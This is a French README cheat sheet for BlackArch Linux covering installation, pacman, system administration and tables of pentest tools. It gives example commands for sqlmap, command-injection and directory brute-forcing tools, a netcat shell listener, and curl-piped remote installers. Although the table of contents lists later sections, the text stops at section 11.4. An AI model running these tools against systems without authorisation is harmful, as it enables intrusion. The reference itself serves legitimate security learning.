# BlackArch Linux 



**Version :** `2026 - 2027`  
**Auteur :** `hackerstchad`  
**Licence :** MIT / Éducation Cybersécurité  
**Langue :** Français 🇫🇷 / Commandes universelles  

[![BlackArch](https://img.shields.io/badge/BlackArch-Linux-000000?style=for-the-badge&logo=arch-linux&logoColor=white)]()
[![Python](https://img.shields.io/badge/Python-3.13%2B-blue?style=for-the-badge&logo=python)]()
[![Arch](https://img.shields.io/badge/Arch-Linux-1793D1?style=for-the-badge&logo=arch-linux&logoColor=white)]()

</div>

---

##  Table des matières

1. [Introduction](#1-introduction)
2. [Installation complète](#2-installation-complète)
3. [Configuration post-installation](#3-configuration-post-installation)
4. [Référence Pacman](#4-référence-pacman)
5. [AUR : Yay & Paru](#5-aur--yay--paru)
6. [Commandes système Arch Linux](#6-commandes-système-arch-linux)
7. [Réseau et connectivité](#7-réseau-et-connectivité)
8. [Utilisateurs et permissions](#8-utilisateurs-et-permissions)
9. [Disques, partitions et LVM](#9-disques-partitions-et-lvm)
10. [Systemd et services](#10-systemd-et-services)
11. [BlackArch - Outils par catégorie](#11-blackarch---outils-par-catégorie)
12. [Scripts Python avancés](#12-scripts-python-avancés)
13. [One-liners Bash & Zsh](#13-one-liners-bash--zsh)
14. [Automatisation avec Ansible](#14-automatisation-avec-ansible)
15. [Ressources, livres et liens](#15-ressources-livres-et-liens)
16. [Annexes](#16-annexes)

---

## 1. Introduction

BlackArch Linux est une distribution basée sur Arch Linux dédiée à la sécurité offensive, au pentesting et à la recherche en cybersécurité. Elle inclut plus de 2800 outils précompilés et est maintenue par une communauté active de chercheurs en sécurité.

### 1.1 Pourquoi BlackArch ?

| Avantage | Description |
|----------|-------------|
| Basé sur Arch | Rolling release, packages à jour, documentation riche |
| Plus de 2800 outils | Couvre reconnaissance, scan, exploitation, post-exploitation, forensics, OSINT |
| Installation flexible | ISO complète, netinstall, ou ajout sur Arch existant |
| Communauté active | GitHub, Discord, forums Arch Linux |
| Personnalisable | i3, Fluxbox, Awesome, XFCE, Openbox disponibles |

### 1.2 Philosophie du README

Ce document est conçu comme un référentiel unique, exhaustif et avancé. Chaque commande est accompagnée d'une description, d'un contexte d'utilisation et d'exemples concrets. Des scripts Python 3 sont fournis pour automatiser des tâches courantes en audit et administration système.

---

## 2. Installation complète

### 2.1 Téléchargement et vérification

```bash
# Télécharger l'ISO officielle
curl -LO https://ftp.harukasan.org/blackarch/iso/blackarch-linux-full-2026.01.01-x86_64.iso

# Télécharger le fichier SHA256
curl -LO https://ftp.harukasan.org/blackarch/iso/blackarch-linux-full-2026.01.01-x86_64.iso.sha256

# Vérifier l'intégrité de l'ISO
sha256sum -c blackarch-linux-full-2026.01.01-x86_64.iso.sha256

# Vérifier la signature GPG
gpg --keyserver keyserver.ubuntu.com --recv-keys 51852D87348FFC4C
gpg --verify blackarch-linux-full-2026.01.01-x86_64.iso.sig
```

### 2.2 Création d'une clé USB bootable

```bash
# Identifier la clé USB (attention à ne pas se tromper de disque)
lsblk

# Écrire l'ISO sur la clé USB (/dev/sdX à adapter)
sudo dd if=blackarch-linux-full-2026.01.01-x86_64.iso of=/dev/sdX bs=4M status=progress conv=fsync

# Alternative avec Ventoy (multi-ISO)
sudo ventoy -i /dev/sdX
```

### 2.3 Installation de BlackArch depuis zéro

```bash
# Démarrer en mode live, identifier le clavier
loadkeys fr

# Lancer l'installateur
blackarch-install

# Ou installation manuelle avancée
fdisk -l
cfdisk /dev/sda

# Formater les partitions
mkfs.fat -F32 /dev/sda1      # EFI
mkswap /dev/sda2             # Swap
mkfs.ext4 /dev/sda3          # Racine

# Monter
mount /dev/sda3 /mnt
mkdir -p /mnt/boot/efi
mount /dev/sda1 /mnt/boot/efi
swapon /dev/sda2

# Installer le système de base
pacstrap /mnt base base-devel linux linux-headers linux-firmware \
    networkmanager vim git sudo grub efibootmgr os-prober \
    xorg-server xorg-xinit pulseaudio blackarch-install-scripts

# Générer fstab
genfstab -U /mnt >> /mnt/etc/fstab

# Chroot
arch-chroot /mnt

# Configuration basique
ln -sf /usr/share/zoneinfo/Europe/Paris /etc/localtime
hwclock --systohc
locale-gen
echo "LANG=fr_FR.UTF-8" > /etc/locale.conf
echo "KEYMAP=fr" > /etc/vconsole.conf
echo "blackarch-pc" > /etc/hostname

# Mot de passe root
passwd

# Bootloader GRUB
grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=BLACKARCH
grub-mkconfig -o /boot/grub/grub.cfg

# Activer NetworkManager
systemctl enable NetworkManager

# Quitter et redémarrer
exit
umount -R /mnt
reboot
```

### 2.4 Ajouter BlackArch sur une Arch Linux existante

```bash
# Télécharger et exécuter le script d'installation du repo
curl -O https://blackarch.org/strap.sh
sha1sum strap.sh  # vérifier la somme
chmod +x strap.sh
sudo ./strap.sh

# Synchroniser les dépôts
sudo pacman -Syyu

# Installer tous les outils BlackArch (optionnel, très lourd)
sudo pacman -S blackarch

# Installer une catégorie spécifique
sudo pacman -S blackarch-scanner blackarch-recon blackarch-exploitation
```

### 2.5 Installation minimale par catégories

```bash
# Reconnaissance
sudo pacman -S nmap masscan theharvester recon-ng amass sublist3r

# Scan de vulnérabilités
sudo pacman -S nikto dirb gobuster wfuzz

# Exploitation web
sudo pacman -S sqlmap burpsuite metasploit

|Réseau
sudo pacman -S wireshark-qt aircrack-ng bettercap hcxtools

|Forensics
sudo pacman -S autopsy sleuthkit volatility3 binwalk

|Reverse engineering
sudo pacman -S ghidra radare2 pwndbg strace ltrace
```

---

## 3. Configuration post-installation

### 3.1 Créer un utilisateur administrateur

```bash
# Créer l'utilisateur
sudo useradd -m -G wheel,audio,video,network,storage,power -s /bin/bash hackerstchad

# Définir le mot de passe
sudo passwd hackerstchad

# Activer sudo pour le groupe wheel
sudo EDITOR=vim visudo
# Décommenter : %wheel ALL=(ALL:ALL) ALL
```

### 3.2 Configuration de Zsh et Powerlevel10k

```bash
# Installer Zsh
sudo pacman -S zsh zsh-completions zsh-syntax-highlighting zsh-autosuggestions

# Changer le shell par défaut
chsh -s /usr/bin/zsh

# Installer Oh-My-Zsh
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"

# Installer Powerlevel10k
git clone --depth=1 https://github.com/romkatv/powerlevel10k.git \
    ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k

# Éditer ~/.zshrc
sed -i 's/ZSH_THEME=".*"/ZSH_THEME="powerlevel10k\/powerlevel10k"/' ~/.zshrc
```

### 3.3 Activer les miroirs rapides

```bash
# Installer reflector
sudo pacman -S reflector

# Classer les meilleurs miroirs
sudo reflector --country France,Germany,Netherlands --protocol https \
    --latest 20 --sort rate --save /etc/pacman.d/mirrorlist

# Sauvegarder périodiquement
sudo systemctl enable reflector.timer
```

### 3.4 Configuration réseau avancée

```bash
# Renommer l'interface si nécessaire
ip link set eth0 down
ip link set eth0 name lan0
ip link set lan0 up

# Configuration statique avec ip
sudo ip addr add 192.168.1.100/24 dev lan0
sudo ip route add default via 192.168.1.1
sudo sh -c 'echo "nameserver 9.9.9.9" > /etc/resolv.conf'

# Configuration avec NetworkManager CLI
nmcli device wifi list
nmcli device wifi connect "SSID" password "motdepasse"
nmcli connection modify "SSID" ipv4.dns "1.1.1.1,8.8.8.8"
```

---

## 4. Référence Pacman

### 4.1 Commandes essentielles Pacman

| Commande | Description | Explication détaillée |
|----------|-------------|----------------------|
| `pacman -Sy` | Synchroniser les bases de données de paquets | Met à jour la liste des paquets disponibles sans installer de mise à jour |
| `pacman -Syu` | Mettre à jour tous les paquets | Synchronise puis met à jour le système entier (rolling release) |
| `pacman -S nom_paquet` | Installer un paquet | Télécharge et installe le paquet depuis les dépôts officiels |
| `pacman -Syu nom_paquet` | Installer à jour | Met à jour la base puis installe le paquet demandé |
| `pacman -R nom_paquet` | Supprimer un paquet | Retire le paquet sans supprimer ses dépendances |
| `pacman -Rs nom_paquet` | Supprimer avec dépendances | Supprime le paquet et ses dépendances non utilisées |
| `pacman -Rns nom_paquet` | Suppression complète | Supprime le paquet, ses dépendances et ses fichiers de configuration |
| `pacman -Ss mot_clé` | Rechercher un paquet | Cherche dans les dépôts synchronisés un mot-clé |
| `pacman -Si nom_paquet` | Informations détaillées | Affiche la description, la taille, les dépendances du paquet distant |
| `pacman -Qi nom_paquet` | Infos paquet installé | Affiche les informations d'un paquet déjà installé |
| `pacman -Ql nom_paquet` | Lister les fichiers installés | Liste tous les fichiers appartenant au paquet |
| `pacman -Qo /chemin/fichier` | Trouver le propriétaire | Identifie quel paquet a installé un fichier donné |
| `pacman -Sc` | Nettoyer le cache | Supprime les anciennes versions des paquets en cache |
| `pacman -Scc` | Vider complètement le cache | Supprime tous les paquets du cache (/var/cache/pacman/pkg/) |
| `pacman -Qdt` | Lister les dépendances orphelines | Affiche les paquets installés comme dépendances mais non utilisés |
| `pacman -Rns $(pacman -Qdtq)` | Supprimer les orphelines | Nettoie automatiquement les dépendances inutiles |
| `pacman -Qe` | Paquets explicitement installés | Liste les paquets installés manuellement par l'utilisateur |
| `pacman -Qm` | Paquets AUR installés | Liste les paquets installés depuis l'AUR ou sources locales |
| `pacman -D --asexplicit nom_paquet` | Marquer comme explicitement installé | Empêche la suppression automatique comme dépendance orpheline |
| `pacman -D --asdeps nom_paquet` | Marquer comme dépendance | Utile pour la gestion des métapaquets |
| `pacman -U /chemin/paquet.pkg.tar.zst` | Installer un paquet local | Installe un paquet compilé localement ou téléchargé |
| `pacman -Sw nom_paquet` | Télécharger sans installer | Récupère le paquet dans le cache sans l'installer |
| `pacman -Qkk` | Vérifier l'intégrité | Vérifie les permissions et les checksums des fichiers installés |
| `pacman -Qk` | Vérifier les fichiers manquants | Détecte les fichiers absents d'un paquet installé |
| `pacman -Fs nom_fichier` | Chercher un fichier dans les paquets | Identifie quel paquet distant fournit un fichier |

### 4.2 Gestion des clés GPG Pacman

```bash
# Réinitialiser les clés si problème de signature
sudo rm -rf /etc/pacman.d/gnupg
sudo pacman-key --init
sudo pacman-key --populate archlinux blackarch
sudo pacman-key --refresh-keys
sudo pacman -Syyu
```

### 4.3 Dépannage Pacman

```bash
# Forcer la réinstallation
sudo pacman -S nom_paquet --overwrite '*'

# Ignorer un paquet lors de la mise à jour
sudo pacman -Syu --ignore=linux

# Mettre à jour sans synchroniser
sudo pacman -Su

# Vérifier les dépendances manquantes
sudo pacman -Dk

# Supprimer un paquet cassé
sudo pacman -Rdd nom_paquet   # à utiliser avec précaution
```

---

## 5. AUR : Yay & Paru

### 5.1 Installation de Yay

```bash
# Installer les dépendances de compilation
sudo pacman -S --needed git base-devel

# Cloner et compiler Yay
git clone https://aur.archlinux.org/yay.git
cd yay
makepkg -si

# Nettoyer
cd .. && rm -rf yay
```

### 5.2 Commandes Yay / Paru

| Commande | Description |
|----------|-------------|
| `yay -S paquet` | Installer un paquet AUR/officiel |
| `yay -Syu` | Mettre à jour les dépôts officiels et AUR |
| `yay -Sua` | Mettre à jour uniquement les paquets AUR |
| `yay -Rns paquet` | Désinstaller proprement |
| `yay -Ss mot_clé` | Rechercher dans AUR et dépôts |
| `yay -Si paquet` | Informations sur un paquet AUR |
| `yay -Qs mot_clé` | Chercher dans les paquets installés |
| `yay -Ql paquet` | Lister les fichiers d'un paquet installé |
| `yay -Sc` | Nettoyer le cache de compilation AUR |
| `yay -Yc` | Supprimer les dépendances de compilation inutiles |
| `yay -G paquet` | Télécharger le PKGBUILD sans compiler |
| `yay --editmenu -S paquet` | Modifier le PKGBUILD avant compilation |
| `yay -Bi dossier` | Compiler un PKGBUILD local |
| `yay --answerclean All --answerdiff None` | Automatiser les prompts |

### 5.3 Paru (alternative moderne)

```bash
# Installation de Paru
git clone https://aur.archlinux.org/paru.git
cd paru
makepkg -si

# Commandes principales
paru -S paquet
paru -Sua
paru -Syua
paru --fm nvim -S paquet
```

---

## 6. Commandes système Arch Linux

### 6.1 Informations système

| Commande | Description |
|----------|-------------|
| `uname -a` | Affiche le noyau, l'architecture et le nom d'hôte |
| `hostnamectl` | Informations sur le système et le noyau |
| `cat /etc/os-release` | Version de la distribution |
| `lscpu` | Informations détaillées sur le processeur |
| `free -h` | Utilisation de la RAM en format lisible |
| `df -h` | Espace disque par partition |
| `du -sh /chemin` | Taille d'un répertoire |
| `lsusb` | Liste des périphériques USB |
| `lspci` | Liste des périphériques PCI |
| `lsblk` | Liste des blocs disque et partitions |
| `dmidecode` | Informations matérielles (nécessite root) |
| `uptime` | Temps écoulé depuis le démarrage |
| `whoami` | Nom de l'utilisateur courant |
| `id` | Identifiants utilisateur et groupes |
| `dmesg | tail` | Derniers messages du noyau |
| `journalctl -xe` | Journaux système détaillés |
| `cat /proc/cpuinfo` | Infos CPU depuis le pseudo-système de fichiers |
| `cat /proc/meminfo` | Infos mémoire détaillées |
| `neofetch` | Affichage esthétique des informations système |
| `btop` | Moniteur système interactif moderne |

### 6.2 Gestion des processus

| Commande | Description |
|----------|-------------|
| `ps aux` | Liste tous les processus détaillés |
| `ps -ef` | Liste des processus avec arborescence |
| `pgrep nom` | Retourne le PID d'un processus par nom |
| `pkill nom` | Tue les processus correspondant au nom |
| `kill PID` | Envoie SIGTERM au processus |
| `kill -9 PID` | Tue immédiatement (SIGKILL) |
| `killall nom` | Tue tous les processus ayant ce nom |
| `top` | Vue dynamique des processus |
| `htop` | Top interactif et coloré |
| `atop` | Surveillance avancée des ressources |
| `nice -n 10 commande` | Lancer avec une priorité réduite |
| `renice -n 5 -p PID` | Modifier la priorité d'un processus |
| `nohup commande &` | Exécuter indépendamment du terminal |
| `commande &` | Lancer en arrière-plan |
| `fg %1` | Ramener un job au premier plan |
| `bg %1` | Reprendre un job en arrière-plan |
| `jobs` | Lister les jobs actuels |
| `watch -n 1 commande` | Exécuter une commande toutes les secondes |

### 6.3 Gestion des fichiers

| Commande | Description |
|----------|-------------|
| `ls -la` | Liste détaillée avec fichiers cachés |
| `ls -lh` | Liste avec tailles lisibles |
| `pwd` | Afficher le répertoire courant |
| `cd -` | Retourner au répertoire précédent |
| `cp -r source dest` | Copier récursivement |
| `cp -a source dest` | Copier en préservant les attributs |
| `mv source dest` | Déplacer ou renommer |
| `rm fichier` | Supprimer un fichier |
| `rm -rf dossier` | Supprimer récursivement et de force |
| `mkdir -p chemin` | Créer les répertoires parents si inexistants |
| `touch fichier` | Créer un fichier vide ou mettre à jour l'horodatage |
| `ln -s cible lien` | Créer un lien symbolique |
| `ln cible lien` | Créer un lien dur |
| `find / -name "*.log"` | Rechercher des fichiers par nom |
| `find . -type f -size +100M` | Rechercher les fichiers volumineux |
| `find . -type f -mtime -7` | Fichiers modifiés en moins de 7 jours |
| `locate fichier` | Recherche rapide via une base indexée |
| `updatedb` | Mettre à jour la base de locate |
| `which commande` | Emplacement d'une commande exécutable |
| `whereis commande` | Localise binaires, sources et manuels |
| `file fichier` | Déterminer le type d'un fichier |
| `stat fichier` | Métadonnées détaillées d'un fichier |
| `chmod 755 fichier` | Modifier les permissions |
| `chmod u+x fichier` | Ajouter l'exécution pour le propriétaire |
| `chown user:group fichier` | Changer le propriétaire et le groupe |
| `chown -R user:group dossier` | Changer récursivement |
| `tar -czvf archive.tar.gz dossier` | Créer une archive gzip |
| `tar -xzvf archive.tar.gz` | Extraire une archive gzip |
| `zip -r archive.zip dossier` | Créer une archive zip |
| `unzip archive.zip` | Extraire une archive zip |
| `rsync -avz source/ dest/` | Synchronisation efficace |
| `rsync -avz --delete source/ dest/` | Synchronisation avec suppression |

### 6.4 Texte et manipulation de flux

| Commande | Description |
|----------|-------------|
| `cat fichier` | Afficher le contenu d'un fichier |
| `tac fichier` | Afficher à l'envers (ligne par ligne) |
| `less fichier` | Visualisation paginée |
| `more fichier` | Visualisation paginée simple |
| `head -n 20 fichier` | Afficher les 20 premières lignes |
| `tail -n 20 fichier` | Afficher les 20 dernières lignes |
| `tail -f fichier` | Suivre un fichier en temps réel |
| `grep "motif" fichier` | Rechercher un motif |
| `grep -i "motif" fichier` | Recherche insensible à la casse |
| `grep -r "motif" dossier/` | Recherche récursive |
| `grep -v "motif" fichier` | Inverser la correspondance |
| `grep -E "motif1|motif2" fichier` | Expressions régulières étendues |
| `sed -i 's/ancien/nouveau/g' fichier` | Substitution in-place |
| `sed -n '10,20p' fichier` | Afficher les lignes 10 à 20 |
| `awk '{print $1}' fichier` | Afficher la première colonne |
| `awk -F: '{print $1}' /etc/passwd` | Utiliser ':' comme séparateur |
| `sort fichier` | Trier les lignes |
| `sort -u fichier` | Trier et supprimer les doublons |
| `uniq` | Supprimer les lignes adjacentes dupliquées |
| `wc -l fichier` | Compter les lignes |
| `wc -w fichier` | Compter les mots |
| `cut -d':' -f1 fichier` | Extraire une colonne |
| `tr 'a-z' 'A-Z' < fichier` | Convertir en majuscules |
| `tee fichier` | Rediriger vers fichier et stdout |
| `xargs commande` | Construire et exécuter des commandes depuis stdin |
| `xargs -I {} cp {} dest/` | Utiliser chaque ligne comme argument |
| `parallel commande ::: liste` | Exécution parallèle |
| `paste fichier1 fichier2` | Fusionner des fichiers côte à côte |
| `diff fichier1 fichier2` | Comparer deux fichiers |
| `comm fichier1 fichier2` | Comparer deux fichiers triés |

---

## 7. Réseau et connectivité

### 7.1 Commandes réseau fondamentales

| Commande | Description |
|----------|-------------|
| `ip addr show` | Afficher les adresses IP des interfaces |
| `ip link show` | Afficher l'état des interfaces réseau |
| `ip route show` | Afficher la table de routage |
| `ip neigh show` | Afficher la table ARP |
| `ping -c 4 8.8.8.8` | Tester la connectivité |
| `ping -I eth0 cible` | Ping via une interface spécifique |
| `traceroute cible` | Tracer le chemin réseau |
| `tracepath cible` | Tracer sans besoin de privilèges élevés |
| `mtr cible` | Combinaison de ping et traceroute |
| `ss -tuln` | Sockets TCP/UDP en écoute, sans résolution DNS |
| `ss -tulnp` | Idem avec les processus associés |
| `netstat -tulnp` | Alternative à ss (obsolète) |
| `lsof -i :80` | Processus utilisant le port 80 |
| `nmap -sV cible` | Scanner les services et versions |
| `nmap -p- cible` | Scanner tous les ports TCP |
| `nmap -sU cible` | Scanner UDP |
| `nmap -A cible` | Scan agressif complet |
| `nmap -sn 192.168.1.0/24` | Découverte des hôtes actifs |
| `curl -I https://site.com` | Récupérer les en-têtes HTTP |
| `curl -L https://site.com` | Suivre les redirections |
| `curl -o fichier https://site.com/fichier` | Télécharger un fichier |
| `wget https://site.com/fichier` | Télécharger avec wget |
| `wget -r -l 2 https://site.com` | Télécharger récursivement |
| `nc -zv cible 1-1000` | Scanner des ports avec netcat |
| `nc -lvp 4444` | Écouter sur un port (bind shell) |
| `nc cible 4444` | Se connecter à un port |
| `socat TCP4-LISTEN:4444,fork STDOUT` | Redirection de port avancée |
| `socat TCP4:cible:80 TCP4:localhost:8080` | Tunnel TCP |
| `dig site.com` | Requête DNS détaillée |
| `dig +short site.com` | Réponse DNS courte |
| `nslookup site.com` | Requête DNS simple |
| `host site.com` | Résolution DNS |
| `whois site.com` | Informations WHOIS |
| `resolvectl query site.com` | Résolution via systemd-resolved |
| `iptraf-ng` | Surveillance réseau interactive |
| `iftop` | Bande passante par connexion |
| `nload` | Utilisation de la bande passante |
| `tcpdump -i eth0` | Capture de paquets |
| `tcpdump -i any -w capture.pcap` | Sauvegarder une capture |
| `tcpdump -r capture.pcap` | Lire une capture |
| `wireshark` | Analyseur de protocoles graphique |
| `tshark -i eth0` | Wireshark en ligne de commande |

### 7.2 Firewall avec iptables / nftables

```bash
# Voir les règles iptables
sudo iptables -L -v -n

# Politique par défaut restrictive
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT

# Autoriser le loopback
sudo iptables -A INPUT -i lo -j ACCEPT

# Autoriser les connexions établies
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Autoriser SSH
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Autoriser HTTP/HTTPS
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Sauvegarder les règles
sudo iptables-save > /etc/iptables/iptables.rules

# nftables équivalent
sudo nft list ruleset
sudo nft add table inet filter
sudo nft add chain inet filter input { type filter hook input priority 0 \; policy drop \; }
```

### 7.3 SSH avancé

```bash
# Générer une clé SSH
ssh-keygen -t ed25519 -C "hackerstchad@blackarch"

# Copier la clé publique sur un serveur
ssh-copy-id utilisateur@serveur

# Connexion avec port non standard
ssh -p 2222 utilisateur@serveur

# Tunnel SSH local
ssh -L 8080:localhost:80 utilisateur@serveur

# Tunnel SSH distant
ssh -R 9090:localhost:3000 utilisateur@serveur

# Proxy SOCKS dynamique
ssh -D 1080 utilisateur@serveur

# Exécuter une commande distante
ssh utilisateur@serveur "ls -la"

# Montage SSHFS
sshfs utilisateur@serveur:/remote /local/mount
```

---

## 8. Utilisateurs et permissions

### 8.1 Gestion des utilisateurs

| Commande | Description |
|----------|-------------|
| `useradd -m nom` | Créer un utilisateur avec répertoire home |
| `userdel -r nom` | Supprimer un utilisateur et son home |
| `usermod -aG wheel nom` | Ajouter à un groupe |
| `passwd nom` | Changer le mot de passe |
| `chage -l nom` | Voir l'expiration du mot de passe |
| `chage -M 90 nom` | Forcer le changement tous les 90 jours |
| `groupadd groupe` | Créer un groupe |
| `groupdel groupe` | Supprimer un groupe |
| `groups` | Afficher les groupes de l'utilisateur courant |
| `getent group wheel` | Voir les membres d'un groupe |
| `su - nom` | Basculer vers un utilisateur avec son environnement |
| `sudo -i` | Obtenir un shell root |
| `sudo -u nom commande` | Exécuter une commande en tant qu'un autre utilisateur |
| `sudo !!` | Réexécuter la dernière commande avec sudo |
| `last` | Historique des connexions |
| `lastlog` | Dernière connexion de chaque utilisateur |
| `who` | Utilisateurs actuellement connectés |
| `w` | Utilisateurs connectés et activité |

### 8.2 Permissions avancées

```bash
# Permissions de base
chmod 700 repertoire      # rwx------
chmod 755 fichier         # rwxr-xr-x
chmod 644 fichier         # rw-r--r--
chmod 777 fichier         # rwxrwxrwx (déconseillé)

# SUID / SGID / Sticky bit
chmod u+s /usr/bin/fichier    # SUID
chmod g+s /repertoire         # SGID
chmod +t /repertoire_partage  # Sticky bit

# ACL
setfacl -m u:alice:rwx fichier
getfacl fichier
setfacl -R -m u:alice:rwx dossier
setfacl -R -d -m u:alice:rwx dossier

# Attributs étendus
chattr +i fichier             # Immutable
chattr +a fichier             # Append-only
lsattr fichier                # Lister les attributs
```

---

## 9. Disques, partitions et LVM

### 9.1 Commandes disque

| Commande | Description |
|----------|-------------|
| `lsblk` | Arborescence des disques et partitions |
| `fdisk -l` | Lister les partitions |
| `fdisk /dev/sdX` | Partitionner interactivement |
| `cfdisk /dev/sdX` | Partitionnement graphique en terminal |
| `parted /dev/sdX` | Partitionnement avancé |
| `mkfs.ext4 /dev/sdX1` | Formater en ext4 |
| `mkfs.btrfs /dev/sdX1` | Formater en Btrfs |
| `mkfs.xfs /dev/sdX1` | Formater en XFS |
| `mkswap /dev/sdX2` | Créer une swap |
| `swapon /dev/sdX2` | Activer la swap |
| `swapoff /dev/sdX2` | Désactiver la swap |
| `mount /dev/sdX1 /mnt` | Monter une partition |
| `umount /mnt` | Démonter |
| `mount -o remount,rw /` | Remonter en lecture/écriture |
| `df -h` | Espace disque |
| `du -sh *` | Taille des éléments du répertoire courant |
| `blkid` | UUID et type des partitions |
| `tune2fs -l /dev/sdX1` | Infos d'une partition ext |
| `fsck /dev/sdX1` | Vérifier et réparer un système de fichiers |
| `e2fsck -f /dev/sdX1` | Forcer la vérification ext |
| `badblocks -v /dev/sdX` | Rechercher les blocs défectueux |
| `hdparm -I /dev/sda` | Infos disque dur |
| `smartctl -a /dev/sda` | Infos SMART |

### 9.2 LVM (Logical Volume Manager)

```bash
# Créer des volumes physiques
sudo pvcreate /dev/sda3 /dev/sdb1

# Voir les PV
sudo pvs
sudo pvdisplay

# Créer un groupe de volumes
sudo vgcreate vg_blackarch /dev/sda3 /dev/sdb1

# Voir les VG
sudo vgs
sudo vgdisplay

# Créer un volume logique
sudo lvcreate -L 50G -n lv_root vg_blackarch
sudo lvcreate -L 100G -n lv_home vg_blackarch

# Voir les LV
sudo lvs
sudo lvdisplay

# Formater
sudo mkfs.ext4 /dev/vg_blackarch/lv_root
sudo mkfs.ext4 /dev/vg_blackarch/lv_home

# Redimensionner
sudo lvextend -L +20G /dev/vg_blackarch/lv_home
sudo resize2fs /dev/vg_blackarch/lv_home
```

### 9.3 Btrfs

```bash
# Créer un filesystem Btrfs
sudo mkfs.btrfs -L data /dev/sda3

# Monter
sudo mount /dev/sda3 /mnt

# Créer des sous-volumes
sudo btrfs subvolume create /mnt/@
sudo btrfs subvolume create /mnt/@home

# Snapshots
sudo btrfs subvolume snapshot / /mnt/snapshots/root_$(date +%Y%m%d)

# Supprimer un snapshot
sudo btrfs subvolume delete /mnt/snapshots/root_20260101

# Scrub
sudo btrfs scrub start /mnt
sudo btrfs scrub status /mnt
```

---

## 10. Systemd et services

### 10.1 Commandes systemd

| Commande | Description |
|----------|-------------|
| `systemctl status service` | État d'un service |
| `systemctl start service` | Démarrer un service |
| `systemctl stop service` | Arrêter un service |
| `systemctl restart service` | Redémarrer un service |
| `systemctl reload service` | Recharger la configuration |
| `systemctl enable service` | Activer au démarrage |
| `systemctl disable service` | Désactiver au démarrage |
| `systemctl is-enabled service` | Vérifier si activé |
| `systemctl list-units --type=service` | Lister les services actifs |
| `systemctl list-unit-files` | Lister tous les unit files |
| `systemctl daemon-reload` | Recharger la config systemd |
| `systemctl edit --full service` | Éditer un service |
| `systemctl mask service` | Masquer un service |
| `systemctl unmask service` | Démasquer un service |
| `systemctl poweroff` | Éteindre |
| `systemctl reboot` | Redémarrer |
| `systemctl suspend` | Mettre en veille |
| `systemctl hibernate` | Hiberner |
| `timedatectl` | Date et heure système |
| `timedatectl set-timezone Europe/Paris` | Changer le fuseau horaire |
| `timedatectl set-ntp true` | Activer NTP |
| `hostnamectl set-hostname nom` | Changer le nom d'hôte |
| `localectl set-keymap fr` | Clavier français console |
| `loginctl show-session` | Infos session |

### 10.2 Journal systemd

```bash
# Voir le journal complet
journalctl

# Journal d'un service
journalctl -u sshd

# Suivre en temps réel
journalctl -f

# Depuis le dernier démarrage
journalctl -b

# Depuis un délai
journalctl --since "1 hour ago"
journalctl --since "2026-01-01 10:00:00" --until "2026-01-02 10:00:00"

# Niveau de priorité
journalctl -p err

# Taille du journal
journalctl --disk-usage

# Nettoyer le journal
sudo journalctl --vacuum-time=7d
sudo journalctl --vacuum-size=500M
```

### 10.3 Timers systemd

```bash
# Lister les timers
systemctl list-timers --all

# Exemple de timer personnalisé
# /etc/systemd/system/backup.timer
# [Unit]
# Description=Backup timer
# [Timer]
# OnCalendar=daily
# Persistent=true
# [Install]
# WantedBy=timers.target

systemctl enable backup.timer
systemctl start backup.timer
```

---

## 11. BlackArch - Outils par catégorie

### 11.1 Reconnaissance (Reconnaissance)

| Outil | Description | Commande exemple |
|-------|-------------|------------------|
| `nmap` | Scanner de ports et services | `nmap -sV -sC 192.168.1.1` |
| `masscan` | Scanner de ports ultra-rapide | `masscan -p1-65535 192.168.1.0/24 --rate=1000` |
| `theHarvester` | Collecte d'emails et sous-domaines | `theHarvester -d site.com -b all` |
| `recon-ng` | Framework OSINT modulaire | `recon-ng` |
| `amass` | Énumération de sous-domaines | `amass enum -d site.com` |
| `sublist3r` | Sous-domaines via moteurs de recherche | `sublist3r -d site.com` |
| `dnsrecon` | Énumération DNS | `dnsrecon -d site.com -t axfr` |
| `fierce` | Scanner DNS | `fierce --domain site.com` |
| `whois` | Requêtes WHOIS | `whois site.com` |
| `maltego` | OSINT visuel | `maltego` |
| `spiderfoot` | Automatisation OSINT | `spiderfoot -l 127.0.0.1:5001` |
| `shodan` | Moteur de recherche d'appareils | `shodan host 8.8.8.8` |
| `censys` | Recherche d'actifs Internet | `censys search "services.port: 443"` |
| `netdiscover` | Découverte d'hôtes actifs | `netdiscover -r 192.168.1.0/24` |
| `arp-scan` | Scan ARP local | `arp-scan -l` |

### 11.2 Scan de vulnérabilités

| Outil | Description | Commande exemple |
|-------|-------------|------------------|
| `nikto` | Scanner web | `nikto -h http://site.com` |
| `dirb` | Brute-force de répertoires | `dirb http://site.com /usr/share/wordlists/dirb/common.txt` |
| `gobuster` | Brute-force de répertoires et DNS | `gobuster dir -u http://site.com -w wordlist.txt` |
| `wfuzz` | Fuzzing web | `wfuzz -c -z file,wordlist.txt http://site.com/FUZZ` |
| `dirsearch` | Brute-force de répertoires | `dirsearch -u http://site.com` |
| `feroxbuster` | Scanner de contenu web rapide | `feroxbuster -u http://site.com` |
| `nuclei` | Scanner de vulnérabilités basé sur templates | `nuclei -u http://site.com` |
| `openvas` | Scanner de vulnérabilités complet | `sudo openvas-start` |
| `lynis` | Audit de sécurité système | `sudo lynis audit system` |

### 11.3 Exploitation web

| Outil | Description | Commande exemple |
|-------|-------------|------------------|
| `sqlmap` | Injection SQL automatisée | `sqlmap -u "http://site.com/page.php?id=1" --dbs` |
| `burpsuite` | Proxy d'interception web | `burpsuite` |
| `owasp-zap` | Scanner web OWASP | `zaproxy` |
| `xsstrike` | Détection XSS avancée | `xsstrike -u "http://site.com/search?q=test"` |
| `commix` | Injection de commandes | `commix -u "http://site.com/cmd.php"` |
| `dalfox` | Fuzzer XSS moderne | `dalfox url http://site.com/?q=1` |
| `ffuf` | Fuzzing web rapide | `ffuf -u http://site.com/FUZZ -w wordlist.txt` |

### 11.4 Exploitation système et réseau

| Outil | Description | Commande exemple |
|-------|-------------|------------------|
| `metasploit` | Framework d'exploitation | `msfconsole` |
